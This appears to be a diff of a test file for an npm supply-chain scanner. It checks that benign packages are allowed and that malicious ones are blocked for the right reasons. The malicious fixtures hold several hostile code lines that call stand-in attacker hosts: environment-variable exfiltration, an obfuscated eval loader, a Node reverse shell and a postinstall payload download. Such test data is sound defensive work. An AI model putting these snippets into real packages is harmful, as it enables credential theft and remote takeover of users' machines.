@@ -1,7 +1,7 @@
-import { test, expect, describe } from "bun:test";
-import { analyze, type AnalysisInput } from "../src/heuristics/index.ts";
-import { score } from "../src/score.ts";
+import { describe, expect, test } from "bun:test";
+import { type AnalysisInput, analyze } from "../src/heuristics/index.ts";
 import type { Category } from "../src/schema.ts";
+import { score } from "../src/score.ts";
 
 function verdictFor(input: AnalysisInput) {
   const established = (input.meta.weeklyDownloads ?? 0) >= 100_000;
@@ -14,25 +14,39 @@ function verdictFor(input: AnalysisInput) {
   });
 }
 
-const blob = (n: number) => "Q".repeat(n); // trips the encoded-blob / long-line obfuscation checks
+const blob = (n: number) => "Q".repeat(n);
 
-// --- Benign corpus: must NEVER block (allow or warn only) --------------------
 describe("false-positive corpus (must not block)", () => {
   const benign: Record<string, AnalysisInput> = {
     esbuild: {
       name: "esbuild",
       version: "0.21.5",
       isNewPackage: true,
-      meta: { maintainers: ["evanw"], existsOnRegistry: true, weeklyDownloads: 40_000_000, ageDays: 120 },
+      meta: {
+        maintainers: ["evanw"],
+        existsOnRegistry: true,
+        weeklyDownloads: 40_000_000,
+        ageDays: 120,
+      },
       addedScripts: { postinstall: "node install.js" },
       changedScripts: {},
-      scanFiles: [{ path: "install.js", text: "const https=require('https');https.get('https://registry.npmjs.org/esbuild-linux/-/bin.tgz');" }],
+      scanFiles: [
+        {
+          path: "install.js",
+          text: "const https=require('https');https.get('https://registry.npmjs.org/esbuild-linux/-/bin.tgz');",
+        },
+      ],
     },
     "node-gyp": {
       name: "node-gyp",
       version: "10.0.0",
       isNewPackage: true,
-      meta: { maintainers: ["npm"], existsOnRegistry: true, weeklyDownloads: 60_000_000, ageDays: 200 },
+      meta: {
+        maintainers: ["npm"],
+        existsOnRegistry: true,
+        weeklyDownloads: 60_000_000,
+        ageDays: 200,
+      },
       addedScripts: { install: "node-gyp rebuild" },
       changedScripts: {},
       scanFiles: [],
@@ -41,16 +55,31 @@ describe("false-positive corpus (must not block)", () => {
       name: "next",
       version: "15.0.0",
       isNewPackage: true,
-      meta: { maintainers: ["vercel"], existsOnRegistry: true, weeklyDownloads: 8_000_000, ageDays: 60 },
+      meta: {
+        maintainers: ["vercel"],
+        existsOnRegistry: true,
+        weeklyDownloads: 8_000_000,
+        ageDays: 60,
+      },
       addedScripts: {},
       changedScripts: {},
-      scanFiles: [{ path: "dist/compiled/index.js", text: `var _bundle="${blob(2100)}";fetch("/_next/data");` }],
+      scanFiles: [
+        {
+          path: "dist/compiled/index.js",
+          text: `var _bundle="${blob(2100)}";fetch("/_next/data");`,
+        },
+      ],
     },
     "@babel/core": {
       name: "@babel/core",
       version: "7.28.0",
       isNewPackage: true,
-      meta: { maintainers: ["babel"], existsOnRegistry: true, weeklyDownloads: 30_000_000, ageDays: 90 },
+      meta: {
+        maintainers: ["babel"],
+        existsOnRegistry: true,
+        weeklyDownloads: 30_000_000,
+        ageDays: 90,
+      },
       addedScripts: {},
       changedScripts: {},
       scanFiles: [{ path: "lib/x.js", text: `var b="${blob(2100)}";Buffer.from(b,"base64");` }],
@@ -59,39 +88,73 @@ describe("false-positive corpus (must not block)", () => {
       name: "class-names",
       version: "1.0.0",
       isNewPackage: true,
-      meta: { maintainers: ["dev"], existsOnRegistry: true, weeklyDownloads: 5_000_000, ageDays: 300 },
+      meta: {
+        maintainers: ["dev"],
+        existsOnRegistry: true,
+        weeklyDownloads: 5_000_000,
+        ageDays: 300,
+      },
       addedScripts: {},
       changedScripts: {},
       scanFiles: [{ path: "index.js", text: "module.exports=function(){return '';};" }],
     },
-    // Real-world regressions: these all false-blocked before calibration.
-    // before recalibration because network/env capability was scored as exfil.
     "express-like (uses http + env, no raw IP)": {
       name: "express",
       version: "5.0.0",
       isNewPackage: true,
-      meta: { maintainers: ["dougwilson"], existsOnRegistry: true, weeklyDownloads: 30_000_000, ageDays: 120 },
+      meta: {
+        maintainers: ["dougwilson"],
+        existsOnRegistry: true,
+        weeklyDownloads: 30_000_000,
+        ageDays: 120,
+      },
       addedScripts: {},
       changedScripts: {},
-      scanFiles: [{ path: "lib/app.js", text: "const http=require('http');const port=process.env.PORT;module.exports=()=>http.createServer();" }],
+      scanFiles: [
+        {
+          path: "lib/app.js",
+          text: "const http=require('http');const port=process.env.PORT;module.exports=()=>http.createServer();",
+        },
+      ],
     },
     "native-installer (install script + child_process + https download)": {
       name: "esbuild",
       version: "0.21.5",
       isNewPackage: true,
-      meta: { maintainers: ["evanw"], existsOnRegistry: true, weeklyDownloads: 40_000_000, ageDays: 120 },
+      meta: {
+        maintainers: ["evanw"],
+        existsOnRegistry: true,
+        weeklyDownloads: 40_000_000,
+        ageDays: 120,
+      },
       addedScripts: { postinstall: "node install.js" },
       changedScripts: {},
-      scanFiles: [{ path: "install.js", text: "const cp=require('child_process');const https=require('https');const proxy=process.env.HTTPS_PROXY;https.get('https://registry.npmjs.org/esbuild-bin');" }],
+      scanFiles: [
+        {
+          path: "install.js",
+          text: "const cp=require('child_process');const https=require('https');const proxy=process.env.HTTPS_PROXY;https.get('https://registry.npmjs.org/esbuild-bin');",
+        },
+      ],
     },
     "deprecated http library (request)": {
       name: "request",
       version: "2.88.2",
       isNewPackage: true,
-      meta: { maintainers: ["mikeal"], existsOnRegistry: true, weeklyDownloads: 10_000_000, ageDays: 900, deprecated: true },
+      meta: {
+        maintainers: ["mikeal"],
+        existsOnRegistry: true,
+        weeklyDownloads: 10_000_000,
+        ageDays: 900,
+        deprecated: true,
+      },
       addedScripts: {},
       changedScripts: {},
-      scanFiles: [{ path: "index.js", text: "const http=require('http');const https=require('https');const t=process.env.NODE_TLS_REJECT_UNAUTHORIZED;" }],
+      scanFiles: [
+        {
+          path: "index.js",
+          text: "const http=require('http');const https=require('https');const t=process.env.NODE_TLS_REJECT_UNAUTHORIZED;",
+        },
+      ],
     },
   };
 
@@ -103,7 +166,6 @@ describe("false-positive corpus (must not block)", () => {
   }
 });
 
-// --- Malicious corpus: must block, for the RIGHT categories ------------------
 describe("true-positive corpus (must block for the right reason)", () => {
   const cases: Array<{ name: string; input: AnalysisInput; category: Category }> = [
     {
@@ -137,7 +199,12 @@ describe("true-positive corpus (must block for the right reason)", () => {
         },
         addedScripts: { postinstall: "node ./setup.js" },
         changedScripts: {},
-        scanFiles: [{ path: "setup.js", text: "const cp=require('child_process');const h=require('https');const t=JSON.stringify(process.env);h.request('http://185.62.1.9/c2');" }],
+        scanFiles: [
+          {
+            path: "setup.js",
+            text: "const cp=require('child_process');const h=require('https');const t=JSON.stringify(process.env);h.request('http://185.62.1.9/c2');",
+          },
+        ],
       },
     },
     {
@@ -150,7 +217,12 @@ describe("true-positive corpus (must block for the right reason)", () => {
         meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 200, ageDays: 1 },
         addedScripts: {},
         changedScripts: {},
-        scanFiles: [{ path: "index.js", text: `var _0x1a2b="${blob(2100)}";fetch("http://evil.example/x");eval(_0x1a2b);` }],
+        scanFiles: [
+          {
+            path: "index.js",
+            text: `var _0x1a2b="${blob(2100)}";fetch("http://evil.example/x");eval(_0x1a2b);`,
+          },
+        ],
       },
     },
     {
@@ -177,7 +249,6 @@ describe("true-positive corpus (must block for the right reason)", () => {
   }
 });
 
-// --- Individual block policies not exercised by the corpus -------------------
 describe("block policy edge cases", () => {
   test("reverse shell blocks even without an install script", () => {
     const v = verdictFor({
@@ -187,7 +258,12 @@ describe("block policy edge cases", () => {
       meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 40, ageDays: 2 },
       addedScripts: {},
       changedScripts: {},
-      scanFiles: [{ path: "index.js", text: "const net=require('net');const s=net.connect(4444,'h');const p=spawn('sh');s.pipe(p.stdin);" }],
+      scanFiles: [
+        {
+          path: "index.js",
+          text: "const net=require('net');const s=net.connect(4444,'h');const p=spawn('sh');s.pipe(p.stdin);",
+        },
+      ],
     });
     expect(v.verdict).toBe("block");
     expect(v.summary).toContain("reverse shell");
@@ -201,7 +277,9 @@ describe("block policy edge cases", () => {
       meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 10, ageDays: 1 },
       addedScripts: { postinstall: "node payload.js" },
       changedScripts: {},
-      scanFiles: [{ path: "payload.js", text: "require('https').get('http://185.62.1.9/payload');" }],
+      scanFiles: [
+        { path: "payload.js", text: "require('https').get('http://185.62.1.9/payload');" },
+      ],
     });
     expect(v.verdict).toBe("block");
     expect(v.summary).toContain("install-time script");
@@ -228,7 +306,12 @@ describe("block policy edge cases", () => {
       meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 10, ageDays: 1 },
       addedScripts: {},
       changedScripts: {},
-      scanFiles: [{ path: "index.js", text: "const b=JSON.stringify(process.env);fetch('http://185.62.1.9/c',{method:'POST',body:b});" }],
+      scanFiles: [
+        {
+          path: "index.js",
+          text: "const b=JSON.stringify(process.env);fetch('http://185.62.1.9/c',{method:'POST',body:b});",
+        },
+      ],
     });
     expect(v.verdict).toBe("block");
     expect(v.summary).toContain("environment variables");
